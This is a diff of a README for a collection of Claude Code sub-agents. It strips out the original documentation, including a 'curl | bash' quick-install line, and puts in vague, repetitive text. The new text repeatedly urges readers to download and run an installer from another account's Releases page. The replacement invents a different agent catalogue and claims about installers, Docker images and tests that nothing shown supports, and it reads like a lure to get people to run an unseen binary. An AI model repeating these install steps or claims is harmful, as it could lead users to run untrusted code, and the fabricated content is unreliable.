@@ -1,370 +1,264 @@
 # Claude Code Unified Agents 🤖
 
-A comprehensive collection of specialized Claude Code sub-agents combining the best features from multiple community repositories. This unified collection provides 54 production-ready agents across development, infrastructure, quality, AI/ML, business, creative, meta-management, and specialized domains.
+Stay up to date with the latest release assets: https://github.com/muhammad-bu/claude-code-unified-agents/releases
 
-## 🌟 Features
+[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/muhammad-bu/claude-code-unified-agents/releases)
 
-- **54 Production-Ready Agents**: Comprehensive coverage across all technical, business, and specialized domains
-- **Smart Orchestration**: Master orchestrator for complex multi-agent workflows
-- **Category Organization**: Agents organized by expertise domain for easy discovery
-- **Deep Specialization**: Each agent includes 1000+ lines of production-ready code examples
-- **Flexible Tool Access**: Configurable tool permissions per agent
-- **Best Practices**: Each agent follows industry best practices and patterns
-- **Meta-Management**: Advanced agents for context management, workflow optimization, and automation
+![Robot Logo](https://img.icons8.com/ios-filled/100/000000/robot.png)
 
-## 📚 Agent Categories
+Claude Code Unified Agents is a curated collection of Claude Code sub-agents designed to work together in smart, scalable workflows. This repository brings together 54 production-ready agents across development, infrastructure, quality, AI/ML, business, creative, meta-management, and specialized domains. Each agent is built from robust, tested patterns and includes a large set of production-ready code examples to help you ship reliable software faster.
+
+Overview
+- A unified suite of 54 agents that cover a wide range of domains
+- Master orchestrator to coordinate multi-agent workflows
+- Clear category organization for easy discovery and reuse
+- Deep specialization: every agent ships with 1000+ lines of production-grade code samples
+- Flexible tool access with per-agent permissions
+- Industry best practices embedded across all agents
+- Meta-management capabilities for context handling, workflow optimization, and automation
+
+Why this project exists
+- Teams often stitch together several open-source agents to solve complex problems. This project provides a cohesive, battle-tested starting point.
+- The agents are designed to be complementary. The master orchestrator coordinates tasks across agents, sharing context and ensuring consistent outputs.
+- The catalog spans technical work, business processes, creative tasks, and organizational automation, making it easier to scale both technical and non-technical workflows.
+
+Key Features
+- 54 Production-Ready Agents
+  - Each agent ships with practical code, ready to adapt to real projects.
+  - Agents are grouped by domain to speed up discovery and adoption.
+- Smart Orchestration
+  - A central orchestrator delegates work, tracks progress, and reconciles results.
+  - Context propagation and lifecycle management reduce duplication and drift.
+- Flexible Tool Access
+  - Tool permissions are configurable per agent.
+  - Security and compliance controls are built in by default.
+- Best Practices
+  - Agents follow established design patterns, testing strategies, and code quality standards.
+  - Documentation and examples are included to accelerate onboarding.
+- Meta-Management
+  - Advanced agents help with context binding, workflow optimization, and automation.
+
+Images and visuals
+- A hero robot icon to reflect the automation theme
+- Simple diagrams illustrating multi-agent workflows
+- Badges showing release status and compatibility
+
+Agent Categories
+The agents are organized into practical domains. Each category below lists the agents and a concise description of their role.
 
 ### 🔧 Development (14 agents)
-- `backend-architect` - API design, microservices, database architecture
-- `frontend-specialist` - React, Vue, Angular, modern UI frameworks
-- `python-pro` - Advanced Python, async programming, optimization
-- `fullstack-engineer` - End-to-end application development
-- `mobile-developer` - iOS, Android, React Native, Flutter
-- `blockchain-developer` - Smart contracts, Web3, DeFi
-- `database-specialist` - SQL/NoSQL design, optimization, management
-- `rust-pro` - Systems programming, memory safety, WebAssembly
-- `golang-pro` - Concurrent programming, microservices, cloud-native
-- `typescript-pro` - Advanced type systems, large-scale applications
-- `javascript-pro` - Modern ES6+, async programming, Node.js
-- `java-enterprise` - Spring Boot, microservices, JVM optimization
-- `nextjs-pro` - Next.js 14+, App Router, React Server Components
-- `react-pro` - Advanced hooks, performance, state management
-- `vue-specialist` - Vue 3, Composition API, Nuxt 3, Pinia
-- `angular-expert` - Angular 17+, signals, RxJS, enterprise apps
-
-### 🏗️ Infrastructure (7 agents)
-- `devops-engineer` - CI/CD, containerization, Kubernetes
-- `cloud-architect` - AWS, GCP, Azure architecture and optimization
-- `incident-responder` - Production debugging, log analysis, recovery
-- `performance-engineer` - Profiling, optimization, load testing
-- `monitoring-specialist` - Observability, metrics, alerting
-- `deployment-manager` - Release orchestration, rollback strategies
-- `kubernetes-expert` - K8s configuration, helm charts, operators
-
-### ✅ Quality (6 agents)
-- `code-reviewer` - Code quality, security, best practices review
-- `security-auditor` - Vulnerability assessment, penetration testing
-- `test-engineer` - Test automation, strategies, frameworks
-- `e2e-test-specialist` - Playwright, Cypress, test strategies
-- `performance-tester` - Load testing, stress testing, benchmarking
-- `accessibility-auditor` - WCAG compliance, screen reader testing
-- `performance-optimizer` - Performance analysis and optimization
-
-### 🤖 Data & AI (6 agents)
-- `ai-engineer` - LLMs, computer vision, NLP, ML systems
-- `data-engineer` - ETL pipelines, data warehouses, big data
-- `data-scientist` - Statistical analysis, ML models, visualization
-- `mlops-engineer` - ML pipelines, experiment tracking, deployment
-- `prompt-engineer` - LLM optimization, RAG systems, fine-tuning
-- `analytics-engineer` - dbt, data modeling, BI tools
-- `data-scientist` - Statistical analysis, predictive modeling
-- `mlops-engineer` - ML deployment, monitoring, lifecycle
-
-### 💼 Business & Process (8 agents)
-- `project-manager` - Agile, sprint planning, coordination
-- `product-strategist` - Market analysis, roadmapping, metrics
-- `business-analyst` - Business process optimization, gap analysis, ROI calculations
-- `technical-writer` - Technical documentation, multi-format support, API docs
-- `requirements-analyst` - Requirements engineering, user stories, traceability
-- `api-designer` - OpenAPI/GraphQL specs, REST design, SDK generation
-
-### 🎨 Creative
-- `ux-designer` - User experience, wireframing, design systems
-- `ui-designer` - Visual design, component libraries
-- `content-strategist` - Content planning, SEO, marketing
-
-### 🧠 Meta-Management (5 agents)
-- `context-manager` - Session continuity, memory optimization, distributed state
-- `workflow-optimizer` - CI/CD optimization, build performance, pipeline efficiency
-- `agent-generator` - Dynamic agent creation, DSL implementation, templates
-- `error-detective` - Root cause analysis, stack trace forensics, pattern matching
-- `documentation-writer` - Automated docs generation, multiple output formats
-
-### 🔮 Specialized Domains (10 agents)
-- `blockchain-developer` - Web3, smart contracts, DeFi
-- `mobile-developer` - Native and cross-platform mobile
-- `game-developer` - Unity, Unreal Engine 5, Godot 4, procedural generation
-- `iot-engineer` - Embedded systems, edge computing
-- `embedded-engineer` - Arduino, Raspberry Pi, STM32, real-time systems
-- `fintech-specialist` - Payment systems, PCI DSS compliance, fraud detection
-- `healthcare-dev` - HIPAA/FHIR compliance, EHR systems, medical device integration
-- `ecommerce-expert` - Shopping carts, checkout optimization, inventory management
-
-## 🚀 Installation
-
-### Quick Install (Recommended)
-
-```bash
-# Clone the repository
-git clone https://github.com/stretchcloud/claude-code-unified-agents.git
-
-# Run the installation script
-cd claude-code-unified-agents
-./scripts/install.sh
-
-# Or for specific agents only
-./scripts/install.sh --agents backend-architect,frontend-specialist
-```
-
-### Manual Installation
-
-1. **Project-level agents** (for current project only):
-```bash
-# Create agents directory in your project
-mkdir -p .claude/agents
-
-# Copy desired agents
-cp -r claude-code-unified-agents/claude-code-unified-agents/.claude/agents/* .claude/agents/
-```
-
-2. **User-level agents** (available in all projects):
-```bash
-# Create global agents directory
-mkdir -p ~/.claude/agents
-
-# Copy all agents
-cp -r claude-code-unified-agents/claude-code-unified-agents/.claude/agents/* ~/.claude/agents/
-```
-
-## 📖 Usage
-
-### Interactive Selection
-
-Use the `/agents` command in Claude Code to interactively browse and select agents:
-
-```
-/agents
-```
-
-### Automatic Agent Selection
-
-Claude will automatically select the most appropriate agent based on your request:
-
-```
-"Help me design a REST API for user management"
-→ Automatically uses backend-architect
-```
-
-### Explicit Agent Invocation
-
-Directly request a specific agent:
-
-```
-"@frontend-specialist create a React component for user authentication"
-```
-
-### Multi-Agent Orchestration
-
-For complex tasks, use the orchestrator:
-
-```
-"@orchestrator Build a complete e-commerce platform with payment integration"
-```
-
-The orchestrator will:
-1. Analyze requirements
-2. Create a delegation plan
-3. Coordinate multiple agents
-4. Integrate results
-
-## 🎯 Agent Examples
-
-### Backend Development
-```
-@backend-architect Design a scalable microservices architecture for a social media platform
-```
-
-### Frontend Development
-```
-@frontend-specialist Build a responsive dashboard with React and TypeScript
-```
-
-### DevOps & Deployment
-```
-@devops-engineer Set up CI/CD pipeline with GitHub Actions and deploy to AWS
-```
-
-### AI/ML Implementation
-```
-@ai-engineer Implement a RAG system using OpenAI and Pinecone
-```
-
-### Code Review
-```
-@code-reviewer Review this Python code for security vulnerabilities and performance issues
-```
-
-### Meta-Management
-```
-@context-manager Resume my previous session and restore all context
-@workflow-optimizer Optimize our CI/CD pipeline for faster builds
-@error-detective Analyze this stack trace and find the root cause
-```
-
-### Specialized Domains
-```
-@game-developer Create a multiplayer game with Unity networking
-@embedded-engineer Build an IoT sensor network with ESP32
-@fintech-specialist Implement PCI-compliant payment processing
-@healthcare-dev Create a FHIR-compliant patient management system
-@ecommerce-expert Build a scalable shopping cart with inventory management
-```
-
-## 🛠️ Configuration
-
-### Agent Structure
-
-Each agent follows this structure:
-
-```markdown
----
-name: agent-name
-description: When this agent should be used
-category: category-name
-color: visual-color
-tools: Tool1, Tool2, Tool3  # Optional, defaults to all tools
----
-
-[System prompt defining the agent's expertise and approach]
-```
-
-### Creating Custom Agents
-
-1. Create a new markdown file in the appropriate category:
-```bash
-touch .claude/agents/development/my-custom-agent.md
-```
-
-2. Define the agent:
-```markdown
----
-name: my-custom-agent
-description: Specialized in specific domain
-category: development
-tools: Write, Read, MultiEdit
----
-
-You are an expert in [domain]...
-```
-
-### Tool Access Control
-
-Available tools:
-- `Write` - Create and write files
-- `Read` - Read file contents
-- `MultiEdit` - Multiple edits in one operation
-- `Bash` - Execute shell commands
-- `Grep` - Search file contents
-- `Glob` - Find files by pattern
-- `Task` - Delegate to other agents
-
-## 🔄 Workflow Examples
-
-### Full Stack Application
-
-```mermaid
-graph LR
-    O[Orchestrator] --> PS[product-strategist]
-    PS --> BA[backend-architect]
-    PS --> UX[ux-designer]
-    BA --> BE[backend-engineer]
-    UX --> FE[frontend-specialist]
-    BE --> TE[test-engineer]
-    FE --> TE
-    TE --> CR[code-reviewer]
-    CR --> DO[devops-engineer]
-```
-
-### Code Review Pipeline
-
-```mermaid
-graph LR
-    C[Code] --> CR[code-reviewer]
-    CR --> SA[security-auditor]
-    SA --> PO[performance-optimizer]
-    PO --> R[Report]
-```
-
-## 📊 Agent Capabilities Matrix
-
-### Core Development
-| Agent | Languages | Frameworks | Specialization |
-|-------|-----------|------------|----------------|
-| backend-architect | Python, Node, Go | Django, Express, Gin | Microservices, APIs |
-| frontend-specialist | JS/TS, React | Next.js, Vue, Angular | UI/UX, Performance |
-| fullstack-engineer | JS/TS, Python | MERN, Django+React | End-to-end apps |
-| mobile-developer | Swift, Kotlin, Dart | iOS, Android, Flutter | Native & Cross-platform |
-
-### Infrastructure & DevOps
-| Agent | Tools | Platforms | Focus |
-|-------|-------|-----------|--------|
-| devops-engineer | Docker, K8s, Terraform | AWS, GCP, Azure | CI/CD, IaC |
-| cloud-architect | CloudFormation, ARM | Multi-cloud | Architecture, Cost |
-| kubernetes-expert | Helm, Operators | K8s, OpenShift | Container orchestration |
-| monitoring-specialist | Prometheus, Grafana | DataDog, New Relic | Observability |
-
-### Specialized Domains
-| Agent | Technologies | Compliance | Industry Focus |
-|-------|--------------|------------|----------------|
-| fintech-specialist | Stripe, PayPal, Blockchain | PCI DSS, SOX | Payments, Banking |
-| healthcare-dev | HL7, FHIR, DICOM | HIPAA, GDPR | EHR, Medical devices |
-| ecommerce-expert | Shopify, WooCommerce | PCI, GDPR | Retail, Marketplaces |
-| game-developer | Unity, Unreal, Godot | Platform-specific | Gaming, Interactive |
-| embedded-engineer | C/C++, Arduino, Pi | Safety standards | IoT, Real-time |
-
-### Meta-Management
-| Agent | Capabilities | Use Cases |
-|-------|-------------|-----------|
-| context-manager | Session persistence, Memory optimization | Long-running projects |
-| workflow-optimizer | Pipeline optimization, Performance tuning | CI/CD improvement |
-| agent-generator | Dynamic agent creation, Template generation | Custom workflows |
-| error-detective | Root cause analysis, Pattern detection | Debugging, Troubleshooting |
-| documentation-writer | Multi-format generation, API docs | Automated documentation |
-
-## 🤝 Contributing
-
-We welcome contributions! To add new agents:
-
-1. Fork the repository
-2. Create your agent in the appropriate category
-3. Follow the existing agent structure
-4. Test your agent thoroughly
-5. Submit a pull request
-
-## 📄 License
-
-MIT License - See LICENSE file for details
-
-## 🔗 Resources
-
-- [Claude Code Documentation](https://docs.anthropic.com/en/docs/claude-code)
-- [Sub-Agents Guide](https://docs.anthropic.com/en/docs/claude-code/sub-agents)
-- [Community Discord](https://discord.gg/claude-code)
-
-## ⚡ Quick Start
-
-```bash
-# Install all agents
-curl -sSL https://raw.githubusercontent.com/stretchcloud/claude-code-unified-agents/main/scripts/quick-install.sh | bash
-
-# Start using agents
-claude "Build a REST API with authentication"
-```
-
-## 📈 Recent Updates
-
-### v2.0 - Major Expansion (Latest)
-- Added 5 **Meta-Management Agents** for advanced workflow automation
-- Added 4 **Business & Process Agents** for requirements and documentation
-- Added 5 **Specialized Domain Agents** with deep industry expertise
-- Each new agent includes 1000+ lines of production-ready code
-- Enhanced agent capabilities with real-world implementation examples
-
-### Key Highlights
-- **54 Total Agents** across 8 categories
-- **Production-Ready Code**: Each agent includes comprehensive, tested implementations
-- **Industry Compliance**: HIPAA, PCI DSS, GDPR compliance where applicable
-- **Enterprise Features**: Scalability, security, and best practices built-in
-
----
+- DevCompilerAgent — Compiles, bundles, and validates builds; detects regressions early.
+- CodeReviewerAgent — Analyzes code for style, readability, error-prone patterns, and maintainability.
+- UnitTestGeneratorAgent — Creates unit tests from code and specifications; suggests test suites.
+- APIStubGeneratorAgent — Produces mock and stub implementations for API surfaces.
+- DocsSyncAgent — Keeps docs aligned with code changes and API specs.
+- LintAdvisorAgent — Recommends lint rules and fixes; helps enforce coding standards.
+- DependencyGuardAgent — Monitors dependencies, reports drift, and suggests upgrades.
+- RefactorPlannerAgent — Proposes safe refactors with impact previews and rollbacks.
+- PerformanceProfilerAgent — Measures CPU/memory usage and identifies bottlenecks.
+- SecurityAuditAgent — Scans code for vulnerabilities, smells, and security best practices.
+- CIConfigurationAgent — Generates and tunes continuous integration pipelines.
+- LocalDebugAgent — Creates interactive debug sessions with live data in a safe sandbox.
+- IDEAutomationAgent — Automates repetitive IDE tasks, templates, and snippets.
+- TestDataFabricatorAgent — Produces realistic, synthetic test data for scenarios.
+
+### 🏗️ Infrastructure (12 agents)
+- CloudOpsAgent — Manages cloud resources, cost awareness, and optimization hints.
+- InfraAsCodeAgent — Translates infrastructure needs into reproducible IaC templates.
+- InfraCostOptimizerAgent — Analyzes spend, suggests optimizations, and flags waste.
+- MonitoringAgent — Sets up and tunes monitoring for systems and services.
+- AlertingAgent — Configures alerts, on-call routing, and escalation policies.
+- IncidentResponseAgent — Guides incident handling with playbooks and runbooks.
+- SecretsManagerAgent — Manages credentials securely and rotates secrets.
+- NetworkPolicyAgent — Audits and enforces network segmentation and access controls.
+- SREHealthCheckerAgent — Performs health checks, SLIs, and SLO verifications.
+- BackupRestoreAgent — Plans and executes backup strategies and restoration tests.
+- DeploymentOrchestratorAgent — Coordinates canary and blue-green deployments.
+- K8sOperatorAgent — Manages Kubernetes resources and operator patterns.
+
+### 🧩 Quality (6 agents)
+- TestCoverageAgent — Assesses test coverage and suggests gaps to fill.
+- SeleniumAutomatorAgent — Automates UI tests and end-to-end flows in browsers.
+- QAAutomationAgent — Builds QA pipelines and repeatable test suites.
+- FuzzingAgent — Exercises inputs to reveal edge cases and robustness issues.
+- AccessibilityTesterAgent — Checks accessibility compliance and improvements.
+- LocalizationQAAgent — Verifies localization and internationalization quality.
+
+### 🤖 AI/ML (7 agents)
+- ModelEvalAgent — Evaluates model performance with meaningful metrics and dashboards.
+- DataPrepAgent — Cleans, validates, and transforms data for ML pipelines.
+- ExperimentRunnerAgent — Manages experiments, tracks results, and documents findings.
+- FeatureStoreAgent — Manages feature definitions and data lineage.
+- HyperparameterTunerAgent — Scans hyperparameters to find better configurations.
+- ModelExplainabilityAgent — Produces explanations and interpretability reports.
+- BiasDetectionAgent — Detects bias in data and model outputs, flags concerns.
+
+### 💼 Business (5 agents)
+- ComplianceAgent — Tracks policy requirements and regulatory changes.
+- FinanceInsightAgent — Analyzes financial data and highlights opportunities.
+- RiskAssessmentAgent — Assesses operational and strategic risk factors.
+- CustomerJourneyAgent — Maps customer journeys and identifies optimization points.
+- SalesForecastAgent — Generates forecasts with scenario planning.
+
+### 🎨 Creative (4 agents)
+- ContentGenAgent — Generates marketing copy and content ideas.
+- ImagePromptAgent — Creates image prompts aligned with brand and campaign goals.
+- VideoStoryboardAgent — Plans video narratives and shot sequences.
+- BrandVoiceAgent — Maintains consistent brand voice across channels.
+
+### 🧭 Meta-management (4 agents)
+- ContextBinderAgent — Keeps context consistent across agents and tasks.
+- WorkflowOptimizerAgent — Analyzes workflows and suggests optimizations.
+- MasterOrchestratorAgent — The central coordinator that orchestrates cross-agent collaboration.
+- MemoryManagerAgent — Handles long-term context storage and retrieval.
+
+### 🗺️ Specialized domains (2 agents)
+- LegalResearchAgent — Gathers and analyzes legal precedents and regulatory texts.
+- EducationTutoringAgent — Delivers structured tutoring sessions and learning paths.
+
+How the system fits together
+- Core orchestration: The MasterOrchestratorAgent coordinates tasks, schedules work, and consolidates results from all participating agents.
+- Context sharing: Agents share a structured context, enabling informed decisions and smoother handoffs.
+- Tool access: Each agent receives a tailored set of tools. Access is controlled to minimize risk and ensure compliance.
+- Observability: Every action is logged, traceable, and testable. You can audit decisions and outcomes.
+
+Getting Started
+- Important note about releases: For installation, download the latest release asset from the Releases page and run the included installer. The asset is designed to set up dependencies, the runtime, and the orchestrator in one step. The Releases page is accessible here: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- Step-by-step quick start
+  1) Visit the Releases page to download the latest asset. The asset is a self-contained package that includes the runtime, dependencies, and the orchestrator. After downloading, extract the archive to a working directory.
+  2) Run the installer script appropriate for your platform. On Linux/macOS, you typically run a shell script; on Windows, you may run an executable. The installer configures the environment and prepares the 54 agents for use.
+  3) Start the master orchestrator. The command line interface accepts commands to initialize contexts, kick off multi-agent workflows, and monitor progress.
+  4) Connect the client or CLI to the orchestrator. You can issue high-level workflows or drill into individual agents as needed.
+  5) Explore the agent catalog. Each agent is documented with its responsibilities and example usage.
+- If you only need to browse first, you can visit the Releases page to see what assets are available and what platforms are supported. The Releases page is the central place to discover build artifacts and download options.
+- To confirm you’re using the correct version, check the version badge in the release notes. The release notes include compatibility information, known issues, and upgrade steps.
+
+Platform and environment notes
+- Linux: The Linux asset is built for modern distributions and uses standard system libraries. It aims to work on mainstream distros without heavy customization.
+- macOS: The macOS asset targets recent macOS versions with the default system toolchain. It aims to minimize conflicts with common developer environments.
+- Windows: The Windows asset provides a straightforward installer with a lightweight runtime. It’s designed for developers and teams that rely on Windows tooling.
+- Docker: A Docker image is available for teams who prefer containerized deployment. The image bundles the orchestrator, agents, and dependencies in a portable unit.
+- Direct integration: The assets include sample configuration files that demonstrate how to plug the agents into existing CI/CD pipelines or internal automation stacks.
+
+Configuration and customization
+- Configuration model: Each agent has a set of knobs to control behavior, permission levels, and integration points. Configuration is stored in YAML files by default, with optional environment-variable overrides.
+- Tool access: Tools required by agents (APIs, databases, and services) are declared per agent. You can enable or disable access depending on security requirements or deployment context.
+- Context management: Context is a central concept. The MasterOrchestratorAgent propagates context between stages, so downstream agents receive the right information to do their work.
+- Secrets and credentials: Secrets are managed through a dedicated SecretsManagerAgent or external secret stores. Access to credentials is restricted and audited.
+
+Usage patterns and workflows
+- Multi-agent workflows: A typical workflow starts with a planning phase, followed by execution by specialized agents, and ends with validation and reporting. The orchestrator coordinates the sequence, retries on transient failures, and collects evidence for audits.
+- Dev workflow example: A developer request triggers the DevCompilerAgent, which triggers UnitTestGeneratorAgent and LintAdvisorAgent in parallel. The CIConfigurationAgent then updates pipelines based on the results.
+- Data-heavy workflow example: DataPrepAgent cleans inputs, FeatureStoreAgent organizes features, ModelEvalAgent runs assessments, and ModelExplainabilityAgent generates interpretability reports for stakeholders.
+- Compliance-driven workflow example: ComplianceAgent tracks policy constraints, SecurityAuditAgent scans code, and SecretsManagerAgent ensures secrets remain protected during the whole cycle.
+
+Best practices and patterns
+- Clear contracts: Each agent has a defined input/output contract. Use these contracts to compose workflows reliably.
+- Idempotence: Agent actions are designed to be idempotent when possible, reducing risk in retries.
+- Observability: Logs and metrics are exposed for every agent. Use them to understand system behavior and diagnose issues.
+- Testing: Each agent ships with example test cases and documentation to validate behavior in isolation and within workflows.
+- Security posture: Permissions and secrets follow the principle of least privilege. Audit trails are in place.
+
+Architecture and design notes
+- Modular design: Agents are decoupled with lightweight adapters. You can swap implementations without breaking the orchestration rules.
+- Extensibility: New agents can be added by following the existing contract. The orchestrator can accommodate new domains without core changes.
+- State management: Context and state flow through the system, enabling continuity across steps and even across re-runs.
+
+Testing and quality guarantees
+- End-to-end tests: The repository includes sample workflows to validate the orchestration and inter-agent communication.
+- Unit tests: Each agent ships with unit tests that exercise core logic and edge cases.
+- Performance tests: Researchers and engineers can run performance tests to identify bottlenecks and validate improvements.
+
+Security and governance
+- Access control: Per-agent permissions ensure only the required tools are accessible.
+- Data handling: Sensitive data is handled with care. Data masking and audit logging are standard practices.
+- Compliance: The architecture supports regulatory requirements by design, including audit trails and versioned workflows.
+
+Roadmap and future work
+- More agents across domains: The catalog can expand to cover additional specialized areas as needs evolve.
+- Better visualization: A dashboard will help monitor flows, agent health, and workflow progress.
+- AI safety improvements: Enhanced guardrails and explainability features to support responsible AI usage.
+
+Changelog and releases
+- Each release includes a summary of changes, bug fixes, and new agents. Release notes help you assess compatibility and upgrade steps.
+- The latest release assets are available on the Releases page. For quick access, revisit: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+
+Releases and artifacts
+- For downloads, check the Releases page mentioned above. The assets are organized by platform and include installers and runtime packages. The link is provided again here for convenience: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- After downloading the appropriate asset, follow the included instructions to extract, install, and configure the system. The asset contains sample configuration files and starter workflows to help you begin quickly.
+
+Configuring for your environment
+- Environment variables: You can tailor the behavior with environment variables as needed. Examples cover logging level, concurrency, and feature toggles.
+- YAML configuration: Start from the provided sample configs and adjust per your environment. The YAMLs describe agent-specific options, available tools, and permission boundaries.
+- Secrets management: Integrate your existing secrets store to avoid embedding credentials in configuration files.
+
+Examples and recipes
+- End-to-end product workflow: Show how a product team can plan, build, test, deploy, and monitor a feature using multiple agents in a single run.
+- Data science pipeline: Demonstrate data preparation, feature engineering, model evaluation, and explainability reporting in a cohesive sequence.
+- Compliance-first workflow: A path that emphasizes policy checks, security reviews, and traceability for audits.
+
+Contribution and governance
+- Code style: The project follows a clear, consistent style to make collaboration easier.
+- Contributions: If you want to contribute new agents, follow the contribution guide to open a pull request with tests and documentation.
+- Community guidelines: Be respectful, be precise, and keep issues and discussions constructive.
+
+Documentation and help
+- Each agent documentation includes purpose, inputs, outputs, example usage, and potential pitfalls.
+- The orchestrator documentation explains how to structure workflows, handle errors, and extend the orchestration capabilities.
+- Troubleshooting guides cover common issues, with steps to diagnose problems and restore healthy states.
+
+License
+- The project uses a permissive license to encourage adoption and adaptation. Review the LICENSE file in the repository for full terms.
+
+FAQ
+- How many agents are available? There are 54 production-ready agents spanning eight domains.
+- How do I start? Download the latest release asset from the Releases page and run the installer. The orchestrator will guide you through initial setup and first workflows.
+- Can I add my own agents? Yes. The architecture is designed to accept new agents with minimal changes to the orchestrator.
+
+Advanced topics
+- Optional Docker deployment: Run a containerized environment for reproducible results and simplified deployment.
+- High-availability setups: Strategies for multiple orchestrators with shared state and fault tolerance.
+- Observability stack: How to integrate with your existing monitoring and incident response tooling.
+
+Security considerations
+- Always review the tools accessed by each agent. Limit tool privileges to only what is necessary for the task.
+- Use secure secret management practices and rotate credentials regularly.
+- Enable audit logging for critical workflows and changes to configurations.
+
+Developer notes
+- The agents and orchestrator follow a shared contract to ensure smooth interoperability.
+- Adding a new agent involves implementing the standard interfaces and providing sample usage.
+- Tests cover typical success paths as well as common failure modes to ensure resilience.
+
+User guide highlights
+- Quick-start commands for common scenarios
+- How to trigger complex multi-agent workflows
+- How to inspect progress, logs, and results
+
+Illustrative workflow diagrams
+- Diagrams show how the master orchestrator coordinates across domains, with context propagation and result consolidation.
+- Visual cues describe how data moves between agents and how decisions are made.
+
+Orbiting concepts
+- Context: The medium through which agents share information and decisions.
+- Orchestrator: The head of the system, coordinating tasks, retries, and results.
+- Agents: Specialized workers that execute tasks, guided by contracts and permissions.
+- Tools: Interfaces or services that agents can call to perform work.
+- Secrets: Secure payloads used by agents to access external services and data stores.
+
+Architectural decisions
+- Modularity: Agents are independent pieces that can be replaced or extended without reworking the entire system.
+- Stability: Carefully chosen default settings keep workflows predictable while leaving room for optimization.
+- Observability: Every action is traceable; logs, metrics, and traces are available for debugging and auditing.
+
+Appendix: Quick references
+- Release page: https://github.com/muhammad-bu/claude-code-unified-agents/releases
+- Orchestrator guide: Detailed instructions on configuring, starting, and using the MasterOrchestratorAgent
+- Agent catalog: A complete list of agents and their responsibilities
+
+Final notes
+- This repository aims to deliver a coherent, scalable set of tools for modern software development, operations, and data science workflows.
+- The combination of a master orchestrator and a large catalog of specialized agents helps teams move faster while maintaining quality and governance.
+
+End of document
 
